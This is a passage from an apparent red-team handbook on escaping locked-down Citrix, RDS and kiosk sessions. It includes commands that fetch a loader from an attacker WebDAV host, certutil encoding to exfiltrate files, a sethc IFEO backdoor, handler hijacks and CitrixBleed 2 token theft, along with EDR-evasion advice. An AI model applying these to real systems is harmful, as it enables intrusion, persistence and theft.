Both RDS and Citrix allow the two directions to be controlled independently, and Citrix additionally restricts which clipboard formats may cross and enforces a maximum size. Text is usually permitted even where file-format clipboard is not.

**Commands.**

```cmd
:: In the session, after pasting base64 text into a file:
certutil -decode %TEMP%\b64.txt %TEMP%\tool.exe

:: Reverse direction, for exfiltrating a small file as text:
certutil -encode %TEMP%\loot.bin %TEMP%\loot.b64
```

Chunk deliberately. Guess a conservative chunk size, verify each chunk arrived intact, and hash the reassembled file before trusting it.

**Detection and opsec.** Clipboard content is a prime DLP inspection target, and a large base64 blob traversing the clipboard is a signature-grade indicator in any environment that inspects it. `certutil -decode` is a well-known LOLBin invocation and is alerted on by default in many EDR configurations; prefer a PowerShell `FromBase64String` or a script-based decode if `certutil` is watched. Consider whether you need a binary at all, since a script is text and needs no encoding.

**Failure modes.** Size limits truncating silently, which is why you hash. Format restrictions. Clipboard redirection disabled in the inbound direction specifically, which is a common asymmetric hardening choice.

#### UNC and WebDAV paths in dialogs

**What it is.** Using a UNC path, over SMB or over HTTP via WebDAV, as both a file source and an execution location, entered wherever the session will accept a path.

**Why it works.** The shell and the Windows file APIs treat a UNC path as a filesystem path. Anywhere you can type a path you can type `\\host\share\file`. The WebDAV redirector extends that to HTTP: `\\host@80\share\file` and `\\host@SSL@443\share\file` are UNC paths that the WebClient service services over HTTP and HTTPS. That matters in a locked-down session for two reasons. SMB egress from a server VLAN is usually blocked while outbound 80 and 443 through a proxy frequently are not, so WebDAV may be your only remote file source. And a file on a remote UNC path is not in a local directory, which interacts with path-based application control rules in ways covered in the Windows Post-Exploitation section.

**Preconditions.** For SMB, outbound 445 to your host, which is usually blocked from a server segment and is worth testing rather than assuming. For WebDAV, the WebClient service running in the session. On Windows Server the WebDAV redirector is part of the Desktop Experience feature and the service is not always running; it is trigger-started, and getting it started as an unprivileged user is a known but fiddly problem. <!-- VERIFY current reliable unprivileged methods for triggering WebClient service start on Windows Server builds -->

**Commands.**

```cmd
sc query WebClient
net use \\$ATTACKER@80\share
dir \\$ATTACKER@SSL@443\share
copy \\$ATTACKER@80\share\loader.exe %APPDATA%\loader.exe
```

**Verify it worked.** The directory listing returns. On your side, a request arrives at the WebDAV server, including a `PROPFIND` before any `GET`.

**Detection and opsec.** An outbound WebDAV connection from a session host to an external host is unusual and is a good detection if anyone is looking. NTLM authentication is attempted to a WebDAV server by default in some configurations, which both leaks a NetNTLMv2 hash to you (see the Coercion, Relay and Certificate Abuse section, where this is a feature rather than a side effect) and creates a distinctive authentication log entry.

**Failure modes.** WebClient not running and not startable. Proxy required with authentication, and the WebDAV redirector's proxy handling not picking up the session's proxy configuration. Egress filtering on the proxy blocking your domain or your unclassified destination.

#### Shortcuts, shell handlers and file associations

**What it is.** A family of techniques that all share the same mechanism: the shell decides what to execute based on data you can write.

**Why it works.** A `.lnk` file is a data file containing a target path and arguments; creating one and launching it is process creation with arbitrary arguments, performed by `explorer.exe` on your behalf. A `.url` file is the same idea over a URI. File associations and protocol handlers are looked up in `HKCU\Software\Classes` before `HKLM\Software\Classes`, and `HKCU` is yours, so you can define what happens when a given extension or scheme is opened in your session. `SendTo` and the shell's `New` submenu are both populated from user-writable locations.

**Preconditions.** Write access to your own profile and `HKCU`. A shell surface to launch from, which the file dialog provides even in a published application.

**Commands.**

```cmd
:: Redefine what opens a chosen extension, in your session only
reg add "HKCU\Software\Classes\.zzz" /ve /d "zzzfile" /f
reg add "HKCU\Software\Classes\zzzfile\shell\open\command" /ve /d "cmd.exe /c %%1" /f
```

```text
Shell moniker navigation, typed into a dialog address bar:
  shell:Startup
  shell:SendTo
  shell:System
  shell:AppsFolder     (the modern Start menu app list as a browsable folder)
```

`shell:AppsFolder` is worth trying specifically: it presents the installed application list as a shell folder, in a session where the Start menu itself is unavailable, and items in it can be launched.

**Detection and opsec.** `HKCU\Software\Classes` handler modification is a documented persistence and defence-evasion technique and is monitored. `.lnk` creation is low signal. Shell moniker navigation is invisible.

**Failure modes.** `NoViewContextMenu` removing the creation routes. Handler hijacks needing something to open the file type, which may never happen. AppLocker blocking the eventual target.

#### The interpreter you were left with

**What it is.** A survey of what can execute code in the session even when the obvious things are blocked, on the principle that the environment almost always retains something.

**Why it works.** Windows ships with many programs that will run other programs or evaluate script, and a lockdown built by blocking `cmd.exe` and `powershell.exe` by name leaves all of them intact. The full treatment of that surface, including the current state of which binaries survive default AppLocker rules and which have been retired from Windows, belongs to the Evasion and Payload Development section and is cross-referenced rather than duplicated. Two items are worth stating here because they are specific to restricted-session work.

`ftp.exe` has an interactive prompt from which a `!`-prefixed line is passed to a command interpreter, and it also accepts a script file with `-s:`. It is a classic restricted-shell escape and it still exists. Note the interaction with `DisableCMD`: because the `!` escape spawns a command processor, a `DisableCMD` value of `1` will block it, while a value of `2` may not.

Batch files remain viable under `DisableCMD = 2`, which is the more common of the two settings. That means writing a `.bat` and launching it, rather than trying to open an interactive prompt, is the right first move whenever you see that value.

```cmd
ftp
> !whoami
> !dir C:\

ftp -s:%TEMP%\ftp.txt
```

**Detection and opsec.** `ftp.exe` spawning a shell is an unusual process tree and is caught by behavioural rules. It is also one of the oldest tricks in this space and is specifically hunted in mature environments.

**Failure modes.** `ftp.exe` not present, since it is a removable optional component on current Windows. `DisableCMD = 1`. Application control denying `ftp.exe`.

#### Escalating a write primitive to execution

**What it is.** The generic bridge from "I can write a file somewhere" to "code runs", which is the situation you land in most often when the only breakout you found was a Save As dialog.

**Why it works.** Several locations are read and executed by the operating system or by other processes without further interaction from you.

| Write target | Executed by | Persistence across host reset |
| --- | --- | --- |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | `explorer.exe` at logon | Yes, if in the roaming profile or container |
| `%APPDATA%\Microsoft\Windows\SendTo` | Shell context menu, on demand | Yes |
| `HKCU\...\CurrentVersion\Run` (registry, via a script) | `explorer.exe` at logon | Yes, lives in `NTUSER.DAT` |
| A writable directory alongside a published application's binary | That application, via DLL search order | No, host-local |
| A user-writable directory on `Path` | Anything resolving a bare command name | Registry part persists, file part does not |
| The profile share, another user's container | That user's session at next logon | Yes, and it is lateral movement |

The last row is the one that changes the engagement. It is developed in the shared-host section below.

**Detection and opsec.** Everything in that table except `SendTo` is a well-covered persistence detection. Choose based on what you need: `SendTo` for a launcher you will use immediately in this session, the profile Startup folder for persistence, another user's profile for lateral movement.

### Kiosk and shell replacement environments

#### What shell replacement actually does

Windows starts a user's shell by reading the `Shell` value from the Winlogon key, machine-wide at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` and per-user at `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`, with the per-user value taking precedence where present. The default is `explorer.exe`. A kiosk build replaces that with the kiosk application, so at logon `userinit.exe` starts your application instead of the shell.

Nothing else changes. There is no shell, so there is no taskbar, no Start menu, no desktop icons and none of the shell policy enforcement that lives in `explorer.exe`. Everything else on the machine is present and untouched, including `explorer.exe` itself. If you can start a process, starting `explorer.exe` gives you a shell, and it will initialise a taskbar and desktop in your session.

Windows also offers two supported kiosk frameworks with different properties. **Shell Launcher** replaces the shell with a specified application (a desktop application in Shell Launcher v2) and can be configured to restart it or log off when it exits. **Assigned Access** builds a single-app or multi-app kiosk with a restricted user experience layer. Both are configured through the Assigned Access configuration service provider, which means their configuration is discoverable through the WMI bridge and their restrictions are, again, user-experience restrictions rather than kernel enforcement.

**Preconditions and detection.** Read the `Shell` values in both hives. A value that is not `explorer.exe` tells you immediately that you are in a shell-replacement kiosk rather than merely a policy-restricted desktop, which is important because it means the shell policy values you found may not be enforced at all (nothing is reading them) while it also means you have no shell surfaces to work from.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

**The write-your-own-shell route.** `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` is user-writable in a default configuration. Set it to `cmd.exe` or to `explorer.exe`, log off and back on, and your session starts with your chosen shell. This is the cleanest kiosk escape available where the kiosk is enforced only by the machine-wide `Shell` value and where you can write to your own hive. It is also persistence, because the value lives in `NTUSER.DAT` and therefore inside the roaming profile or container.

```cmd
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
```

The obvious catch is that you need a way to write that value before you have a shell, which loops you back to the breakout techniques above. A single Save As dialog plus a `.reg` file is enough if something in the session will apply it, but the more direct route is any script engine, since `WScript.Shell` has `RegWrite`.

**Failure modes.** Group policy re-applying a machine-wide `Shell` and the loopback processing making the per-user value irrelevant. The kiosk being Assigned Access rather than a `Shell` replacement, in which case the mechanism differs. `explorer.exe` blocked by application control, which is a genuinely effective hardening step against this whole family.

#### Accessibility and utility manager routes

**What it is.** The accessibility applications, `sethc.exe` (Sticky Keys, five presses of Shift), `utilman.exe` (Windows key plus U), `osk.exe` (On-Screen Keyboard), `Magnify.exe`, `Narrator.exe` and `DisplaySwitch.exe` (Windows key plus P), are launchable by keyboard sequence from a locked-down session and, at a physical console, from the logon screen.

**Why it works.** Two distinct mechanisms, and they are worth keeping separate because they yield very different things.

The classic technique replaces the accessibility binary in `System32`, or points its Image File Execution Options `Debugger` value at `cmd.exe`, so that triggering the accessibility feature starts a shell instead. At a **physical console logon screen** that shell runs as SYSTEM, because Winlogon starts accessibility tools before any user has authenticated. That is the version of the trick everybody knows, and it requires write access to `System32` or to `HKLM`, meaning it is a persistence and privilege-retention technique rather than an initial breakout. It is also mostly irrelevant to a remote session, because in RDP and ICA the credential prompt is handled before the session exists, so there is no remote logon screen to press Shift at. It becomes relevant again if you have console access to the virtual machine through the hypervisor, which is the virtualisation material earlier in this section.

Inside an established session, the same trigger starts the accessibility application in your session at your privilege level. If you have replaced the binary or set the IFEO debugger, you get a shell as yourself, which breaks a **shell-level** kiosk but does nothing about application control. If you have not, you still get the accessibility application itself, and those applications are processes with menus, settings links and help, which puts you back in the earlier breakout families: Narrator's settings and help open the Settings app and a browser, On-Screen Keyboard is a window with a context menu, Magnifier's settings link into the Settings app which links onward to many other things.

**Preconditions.** For the substitution routes, write access to `%SystemRoot%\System32` or to the IFEO key, both of which need administrator. For the in-session trigger routes, only that the accessibility features and their key sequences are enabled, which by default they are.

**Commands.**

```cmd
:: IFEO debugger substitution, requires local administrator. Persistence-grade.
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" ^
  /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

:: Check for someone else's already-planted version, which happens more than you would think.
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s /f Debugger
```

**Verify it worked.** Trigger the sequence and confirm the process that starts. Check the token with `whoami /all` because SYSTEM versus your own user is the entire point.

**Detection and opsec.** IFEO `Debugger` values are a classic and well-covered detection, both as persistence and as defence evasion. Modifying `System32` binaries trips file integrity monitoring and, where Windows Defender Application Control or Secure Boot measured integrity is in play, may not work at all. `sethc.exe` starting `cmd.exe` is an extremely high-fidelity alert.

**Failure modes.** No write access, which is the usual case at breakout time. Accessibility shortcuts disabled. WDAC preventing the substituted binary from running. On a session host, note that `System32` modification affects every user on the host, which makes it both more powerful and much more likely to be noticed.

#### Recovering a usable shell

Once you have any process creation primitive, get a real working environment rather than continuing to fight the interface. In rough order of preference:

Start `explorer.exe`. It initialises a shell in your session, taskbar and all, and everything becomes normal Windows. Note that shell policy values now apply, which is a small step backwards, so read them first and be ready to work around `RestrictRun`.

Start `taskmgr.exe` and use File, then Run new task. Task Manager's run dialog creates the process itself rather than delegating to `explorer.exe`, so it is not subject to explorer's `RestrictRun` and `DisallowRun` filtering, and the "create this task with administrative privileges" tick box is there if you are in the administrators group. `DisableTaskMgr` blocks this.

Start a scripting host, `powershell.exe`, `cscript.exe` or `wscript.exe`, and work from there. Check `$ExecutionContext.SessionState.LanguageMode` immediately, and if it returns `ConstrainedLanguage` go to the Windows Post-Exploitation section rather than fighting it here.

Establish a C2 channel and stop using the interactive session at all, which is both more capable and less visible than driving a GUI over a display protocol. See below and the Command and Control section.

### Citrix Virtual Apps and Desktops, and Citrix DaaS

#### Components and what compromising each yields

| Component | Role | What compromise yields |
| --- | --- | --- |
| Citrix Workspace app | Client software on the user endpoint. Formerly Citrix Receiver | Stored store URLs, cached credentials, the ability to craft ICA files |
| StoreFront | On-premises web front end that authenticates users and enumerates their entitled resources. Replaced by the Workspace service in Citrix DaaS | The full published resource catalogue for any user you can authenticate as, and launch tickets |
| Delivery Controller | The broker. Runs the Broker Service, decides which machine serves which session, provides the XML/STA service, hosts Machine Creation Services | Site-wide control: publish applications, change published application command lines, target delivery groups, enumerate every session |
| Site database | SQL Server. A site uses three databases: Site (site configuration), Monitoring, and Logging (configuration logging) | Effectively site administration, plus the full configuration and audit history. See the MSSQL material in the Enterprise Services section |
| Web Studio | The current browser-based management console, replacing the legacy Citrix Studio MMC snap-in | Site administration through a supported interface |
| Director | Monitoring and help desk console, reading the Monitoring database | Full session inventory, and in help-desk roles the ability to shadow and log off sessions |
| VDA | The agent on each session host or virtual desktop | The session host itself, which is where the shared-host material below applies |
| Citrix Provisioning | Streams a read-only vDisk to target devices, formerly Provisioning Services | The vDisk, meaning SYSTEM on every machine streaming it |
| Machine Creation Services | Clones machines from a master image snapshot, run by the Controller | The master image, meaning SYSTEM on every machine built from it |
| Cloud Connector | In Citrix DaaS, the domain-joined on-premises broker between Citrix Cloud and the estate | A cloud-to-on-premises code execution path |
| Citrix Gateway on NetScaler | The internet-facing remote access appliance | Pre-authentication network position and, historically, remote code execution |
| Workspace Environment Management | Applies environment settings and runs tasks in user sessions | Direct code execution in every user session, by design |
| Session Recording | Records session screens and metadata | The recordings, plus a historically vulnerable server component |
| Licence Server | Licensing | Little directly, but it is a domain-joined Windows server nobody patches |

Ports worth knowing: ICA and HDX on TCP 1494, session reliability (Common Gateway Protocol) on TCP 2598, EDT as the UDP transport for both, StoreFront and Gateway on 443, and the Controller's XML and STA service on 80 or 443. VDA registration with the Controller uses a configurable port. <!-- VERIFY default VDA-to-Controller registration port on current CVAD builds -->

#### The ICA file

**What it is.** An `.ica` file is the launch configuration handed to the Workspace app when a user clicks a published resource. It is a plain-text INI-style file and it names the server address, the resource to launch, the transport settings, and the one-time ticket authorising the launch.

**Why it matters.** The fields tell you a great deal about the environment, and historically the file was the breakout. `Address` gives you the session host or the Gateway. `InitialProgram` names the resource being launched, conventionally as `#` followed by the published application's browser name. `Domain` and `Username` name the account. Older deployments carried a `ClearPassword` field, obfuscated rather than encrypted. Modern deployments carry a single-use logon ticket instead.

The classic attack, and the reason the current defaults exist, was to edit `InitialProgram` in a downloaded `.ica` file to name an arbitrary program rather than a published resource, and relaunch it. That behaviour was the subject of CVE-2002-2426 in the Presentation Server era. It is generally not viable now, because the launch is validated against the user's entitlements by the broker rather than trusted from the client. The setting that controls whether the XML service trusts requests it is sent, rather than validating them, is the relevant hardening item, and where it has been enabled for a legacy integration the old attack surface returns. <!-- VERIFY exact current name of the "trust requests sent to the XML service" site setting and the PowerShell parameter that reads it -->

**Commands.** Capture the file rather than letting the browser hand it straight to the Workspace app: configure your browser to save `.ica` files, or take it from the browser's download directory or from the Workspace app's temporary directory.

```text
Fields worth reading in a captured .ica:
  Address=            session host or gateway address, sometimes an internal IP
  InitialProgram=     the published resource, or a desktop
  Domain= Username=   the account and domain, useful even without a password
  SSLEnable= SSLProxyHost=   gateway topology
  ClearPassword=      legacy, obfuscated not encrypted
  ClientAudio, ClientDrive, ClipboardRedirection ... redirection request flags
```

Two things in a captured ICA file are valuable regardless of whether you can tamper with it. The `Address` field frequently discloses the internal address or hostname of the session host directly, which is reconnaissance you get for free. And the redirection request flags tell you what the deployment intends to allow.

**Detection and opsec.** Launching an edited ICA file produces a broker-side rejection that is logged. Repeated failed launches with unusual resource names are a clear indicator.

**Failure modes.** Ticket already consumed, since launch tickets are single-use and short-lived. The broker validating the resource against entitlements, which is the default. The Gateway requiring an STA ticket that only the legitimate flow produces.

#### Workspace app configuration on the client

If you have the user's endpoint, or a copy of its configuration, the Workspace app's own configuration tells you the store URLs, the gateway addresses, the beacon addresses used to decide internal versus external, and the client-side lockdown profile.

```cmd
reg query "HKCU\Software\Citrix" /s
reg query "HKLM\SOFTWARE\Citrix" /s
reg query "HKLM\SOFTWARE\WOW6432Node\Citrix" /s
dir "%APPDATA%\ICAClient"
dir "%LOCALAPPDATA%\Citrix"
```

Client-side hotkey and virtual channel behaviour is configured under the Workspace app's lockdown profile tree in the client registry, which is also where restrictions the administrator applied to the client itself live. Because they are on the client, they are yours to change if the client is yours. <!-- VERIFY exact registry path for the Citrix Workspace app lockdown profile and virtual channel keys on current builds -->

Citrix defines a set of hotkeys that the Workspace app translates into key sequences delivered to the remote session, because sequences like Ctrl+Alt+Del are intercepted locally and never reach the session. The mapping that sends Ctrl+Alt+Del into the session is the useful one, because the Windows security screen it produces contains Task Manager, which is a launcher, inside a session that was supposed to have none. <!-- VERIFY current Citrix Workspace app hotkey table, specifically which combination maps to Ctrl+Alt+Del and which shows the remote Start menu --> For Remote Desktop sessions the equivalent is Ctrl+Alt+End, which is documented and reliable.

#### Enumerating published resources through StoreFront

**What it is.** StoreFront exposes an HTTP API that lists the resources a user is entitled to, and that list is the map of the delivery estate from the user's point of view: every published application, every published desktop, and the launch URL for each.

**Why it works.** StoreFront's Store Services API is a documented REST-ish interface. `GET` against the store's resource enumeration endpoint, conventionally `/Citrix/<StoreName>/resources/v2`, returns XML describing each entitled resource including its launch URL. The Receiver for Web site (conventionally `/Citrix/<StoreName>Web`) is the browser front end over the same store.

**Preconditions.** Valid credentials for the store, or a session cookie from one. There is no unauthenticated resource enumeration by design. The value here is post-authentication: with one user's credentials you learn the whole published catalogue that user can reach, which is your target list.

**Commands.**

```bash
# The Receiver for Web site, for a browser-driven look.
curl -sk https://$TARGET/Citrix/StoreWeb/ | head -40

# Authenticated resource enumeration against the store services endpoint.
# Authentication mechanism depends on the store configuration.
curl -sk https://$TARGET/Citrix/Store/resources/v2
```

<!-- VERIFY exact authentication flow and required headers for an unattended GET against /Citrix/<Store>/resources/v2 on current StoreFront builds -->

**What to look for in the output.** Published desktops are more useful than published applications, so check whether the user is entitled to any. Published administrative tools (a console, a management client, an SSMS, a PowerShell) are the jackpot, because they carry delegated privilege. Applications published to a different delivery group than the rest tell you there are session hosts you have not seen.

**Detection and opsec.** Authenticated enumeration looks like a normal client refreshing its resource list. Repeated failed authentication to StoreFront produces the usual account lockout risk, discussed in the Active Directory: Enumeration section.

#### The Citrix policy layer

**What it is.** Citrix maintains its own policy system, parallel to and independent of Windows group policy, which governs HDX behaviour: redirection of drives, clipboard, printers, USB and audio, session limits, bandwidth, and a large number of feature toggles.

**Why it matters.** The restrictions you are fighting in a Citrix session are frequently Citrix policy rather than Windows policy, which means `gpresult` will not show them and you will conclude wrongly that no restriction exists. Citrix policies can be authored in Web Studio, held in the site database, or authored in Active Directory group policy through the Citrix Group Policy Management extension, and the two sources are combined with the AD-authored policies taking priority. Registry settings relating to policy filtering are held on the session host under `HKLM\SOFTWARE\Citrix\Ica\GroupPolicy`, and a number of HDX features are additionally controlled by documented registry values rather than by policy.

The supported way to see the effective result is the Citrix Group Policy Modeling wizard, and Citrix specifically notes that running it from the Group Policy Management Console will miss policies authored in Web Studio, so it must be run from Web Studio to give a complete resultant set. That is an administrative tool, not something you run from a restricted session, but it is exactly the thing to run once you reach the management plane.

**From inside a session**, read the Citrix registry tree and infer:

```cmd
reg query "HKLM\SOFTWARE\Citrix\Ica\GroupPolicy" /s
reg query "HKLM\SOFTWARE\Citrix" /s /f Redirect
reg query "HKLM\SOFTWARE\Policies\Citrix" /s
```

<!-- VERIFY whether HKLM\SOFTWARE\Policies\Citrix exists as an effective-policy location on current VDA builds, and what subkeys hold redirection state -->

The empirical approach is better than the registry approach here: try each redirection channel and see what happens. A `dir \\Client\C$` that works tells you client drive mapping is on, definitively, in a way that reading a registry key does not.

#### Content redirection and the other HDX features

Citrix ships a set of redirection features that exist to improve user experience and that each move execution or data across the client-session boundary. They are worth knowing because each is a channel.

**Client drive mapping** presents client volumes into the session as UNC links under `\\Client\`. **Client folder redirection** presents only a user-nominated portion of the client filesystem instead, appearing as UNC links inside the session, and where UNC links are disabled by registry the redirected folders appear as mapped drives instead. **Clipboard redirection** synchronises the clipboard, with separate controls for direction, permitted formats and maximum size. **Client printer redirection** creates printers in the session pointing at the client's. **Generic USB redirection** presents client USB devices into the session. **Local App Access** and **host-to-client** and **client-to-host content redirection** cause URLs and file types opened on one side to be launched on the other, which is a genuine cross-boundary execution primitive in both directions and is worth checking for specifically. **File transfer** in the HTML5 and browser-delivered clients is a separate control from drive mapping, governed by its own policies for upload and download.

<!-- VERIFY exact current Citrix policy setting names for client drive redirection, clipboard redirection direction and format controls, the clipboard maximum size limit and its default, generic USB redirection, and the HTML5 client file transfer, upload and download settings -->

#### Citrix Session Recording

**What it is.** An optional CVAD component that records session screen activity and events to a recording server for later playback, deployed in regulated environments and in third-party access scenarios specifically.

**Why it matters to you, twice over.** First, opsec: if it is deployed and your session is being recorded, every window you open and everything you type is on video, and no amount of process-level evasion helps. Check for it early. Second, it has been a target in its own right: CVE-2024-8068 is a privilege escalation to the NetworkService account exploitable by an authenticated user in the same Active Directory domain as the session recording server, and CVE-2024-8069 is a deserialisation of untrusted data giving limited remote code execution as NetworkService. Chained, they give remote code execution as SYSTEM on the recording server. The root causes were an insecure `BinaryFormatter` deserialisation and an MSMQ service reachable over HTTP. Both were added to CISA's Known Exploited Vulnerabilities catalogue.

**Commands.** Look for the agent on the session host and the server in the estate.

```powershell
Get-Service | Where-Object DisplayName -match 'Session Recording'
Get-ChildItem 'C:\Program Files\Citrix' -Filter '*SessionRecording*' -Recurse -Depth 2 -ErrorAction SilentlyContinue
```

**Detection and opsec.** If recording is active, treat the session as observed. Prefer to break out, establish C2, and do the rest of the work through the C2 channel, because the recording captures the interactive session and not necessarily the activity of a process running headless. That is a meaningful and often decisive advantage.

#### NetScaler and Citrix Gateway

The internet-facing appliance is outside the scope of a breakout part but it is the front door to every environment discussed here and its vulnerability history is directly relevant, both as an access route and because a compromised Gateway sits in the authentication path for every session.

| CVE | Product | Class | Yield |
| --- | --- | --- | --- |
| CVE-2019-19781 | Citrix ADC and Gateway | Path traversal to remote code execution | Unauthenticated code execution on the appliance |
| CVE-2023-3519 | NetScaler ADC and Gateway | Unauthenticated remote code execution | Code execution on the appliance |
| CVE-2023-4966, "CitrixBleed" | NetScaler ADC and Gateway | Sensitive information disclosure via buffer over-read | Session tokens leaked from memory, enabling session hijack and MFA bypass |
| CVE-2025-5777, "CitrixBleed 2" | NetScaler ADC and Gateway | Insufficient input validation leading to uninitialised stack memory disclosure | Roughly 127 bytes of stack memory per request returned in the `<InitialValue>` element of the response to a `POST /p/u/doAuthentication.do` carrying a valueless `login` parameter. Repeated requests return different memory. Leaked session tokens are replayed against the Gateway portal to assume authenticated sessions without an MFA challenge |
| CVE-2025-6543 | NetScaler ADC and Gateway | Memory overflow | Exploited in the wild |
| CVE-2024-8068 and CVE-2024-8069 | Citrix Session Recording | Privilege escalation and deserialisation RCE | Chained to SYSTEM on the recording server, requires a domain-authenticated position |

CitrixBleed 2 affects configurations where the appliance is a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or an AAA virtual server, in 14.1 before 14.1-43.56 and 13.1 before 13.1-58.32. The pattern across both CitrixBleed variants is worth internalising: the yield is a session token, and a session token bypasses multi-factor authentication entirely, because MFA happened before the token was minted. Where you have obtained one, the follow-on is to use the hijacked Gateway session to enumerate and launch published resources as that user, which lands you exactly in the situation the rest of this part addresses.

### Remote Desktop Services

#### Roles and what each yields

| Role | Function | What compromise yields |
| --- | --- | --- |
| RD Session Host | Runs the sessions | The shared host, with everything in the shared-host section below |
| RD Connection Broker | Assigns users to session hosts, holds collection configuration. Uses a Windows Internal Database by default and SQL Server in a highly available deployment | Collection configuration, meaning the published RemoteApp definitions |
| RD Web Access | Web front end listing published resources and serving `.rdp` files | The resource catalogue, and a phishing-grade front end |
| RD Gateway | Tunnels RDP over HTTPS from the internet, TCP 443 and UDP 3391 | A pre-authentication network position and the ability to reach internal hosts |
| RD Licensing | Licensing | Little, but it is another unpatched domain member |

The strategically important point about RDS is that it has no proprietary management plane. The roles are Windows features on Windows servers, the configuration is in Windows registry and a local database, and the access control is Active Directory group membership. **For RDS, the management plane is Active Directory**, which means the rest of this document already covers it and there is no separate platform to attack. That is a real difference from Citrix and Horizon, where a distinct product-specific control plane exists and is often less well defended than AD itself.

#### RemoteApp and the allow list

**What it is.** RemoteApp publishes a single application rather than a desktop. It is implemented by setting the RDP connection's alternate shell to the published program, and the session host enforces which programs may be requested using an allow list.

**Why it works, and where it breaks.** The allow list lives in the registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList`, with published applications enumerated as subkeys of `TSAppAllowList\Applications`. Two values matter enormously.

`fDisabledAllowList` under `TSAppAllowList` controls whether the allow list is enforced. Where the allow list is disabled, the session host will honour an arbitrary `alternate shell` or `remoteapplicationprogram` requested by the client, meaning a client-side edit of the `.rdp` file to name `cmd.exe` simply works. This is a configuration you will still meet, particularly on ad hoc RemoteApp deployments and on non-server Windows configured for RemoteApp by hand.

`CommandLineSetting`, per published application, controls whether a client-supplied command line is honoured. Value `0` disables the command line, `1` uses the command line from the `.rdp` file if one is present and otherwise the registered one, and `2` uses only the registered command line. **`CommandLineSetting` of `1` is the interesting case**, because it means the client controls the arguments passed to the published program. Whether that is a breakout depends entirely on the program: arguments to a text editor are not much, arguments to anything that will load a script, open a shell, or specify a plugin path are everything.

**Commands.** Read the allow list from inside a session if you can, and from any session host you reach:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList" /v fDisabledAllowList
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList\Applications" /s
```

```powershell
# From a management position, via the RDS PowerShell module
Get-RDSessionCollection
Get-RDRemoteApp
Get-RDSessionHost -CollectionName '<collection>'
Get-RDUserSession
```

<!-- VERIFY exact parameter sets for Get-RDRemoteApp, Set-RDRemoteApp and Get-RDUserSession on current Windows Server builds -->

**Verify it worked.** A modified `.rdp` connects and produces the program you asked for. A blocked one produces a specific server-side refusal, "the following RemoteApp program is not in the list of authorised programs", which is a clean and unambiguous answer.

**Detection and opsec.** A refused RemoteApp launch is logged on the session host and is a high-quality indicator of exactly what you were trying to do. Test once, read the answer, and do not iterate through a list of executables.

#### RDP file properties worth knowing

The `.rdp` file is the client-side connection description. Everything in it is a *request*; the session host decides what to honour. Understanding which is which saves a lot of confusion.

| Property | Meaning | Enforcement |
| --- | --- | --- |
| `full address:s:` | Target host | Client |
| `alternate shell:s:` | Program to run instead of the shell | Server-validated against `TSAppAllowList` in RemoteApp mode |
| `remoteapplicationmode:i:` | Enable RemoteApp mode | Client request |
| `remoteapplicationprogram:s:` | The RemoteApp to launch, often as `||alias` | Server-validated |
| `remoteapplicationcmdline:s:` | Arguments to the RemoteApp | Server-validated via `CommandLineSetting` |
| `drivestoredirect:s:` | Which client drives to redirect, `*` for all | Server may refuse via GPO |
| `redirectclipboard:i:` | Clipboard redirection | Server may refuse |
| `redirectprinters:i:` | Printer redirection | Server may refuse |
| `redirectcomports:i:` | COM port redirection | Server may refuse |
| `redirectsmartcards:i:` | Smart card redirection | Server may refuse |
| `usbdevicestoredirect:s:` | USB redirection, RemoteFX | Server may refuse |
| `gatewayhostname:s:` | RD Gateway to tunnel through | Client |
| `enablecredsspsupport:i:` | Network Level Authentication | Client, with server-side requirement possible |
| `promptcredentialonce:i:` | Credential handling for gateway plus host | Client |

<!-- VERIFY the exact spelling of redirectdrives, devicestoredirect and usbdevicestoredirect against current Microsoft RDP file settings documentation -->

The server side of redirection lives under Computer Configuration, Administrative Templates, Windows Components, Remote Desktop Services, Remote Desktop Session Host, Device and Resource Redirection, and is written into `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services` as a set of `fDisable*` values covering drive mapping, clipboard, COM ports, LPT ports, printers and plug-and-play redirection. <!-- VERIFY exact fDisable value names: fDisableCdm, fDisableClip, fDisableCcm, fDisableLPT, fDisableCpm, fDisablePNPRedir -->

The same policy key holds the settings that build a restricted session in the first place: an initial program to start on connection, and whether a client-specified program is inherited or overridden. Reading that key from inside a session tells you exactly how the restriction was constructed. <!-- VERIFY the exact value names for the "Start a program on connection" policy, believed to be InitialProgram, WorkDirectory and fInheritInitialProgram -->

#### The gateway

RD Gateway publishes RDP over HTTPS, which means an internet-facing authentication endpoint for domain credentials and, once through it, RDP reachability to whatever internal hosts the connection authorisation and resource authorisation policies permit. Two operational notes. Password spraying against a gateway is a domain credential attack with the usual lockout considerations from the Active Directory: Enumeration section. And the resource authorisation policy defines which internal hosts a gateway user may reach, so an over-permissive one turns a single set of user credentials into RDP access across the estate from the internet.

### Azure Virtual Desktop

**What it is.** Microsoft's managed RDS. The control plane is an Azure service; you supply the session hosts as Azure virtual machines. Sessions are organised into **host pools** (a set of session hosts, either `pooled` with multiple users per host or `personal` with one assigned user per host), **application groups** (either a `Desktop` group publishing the full desktop or a `RemoteApp` group publishing individual programs), and **workspaces** (the logical grouping users subscribe to).

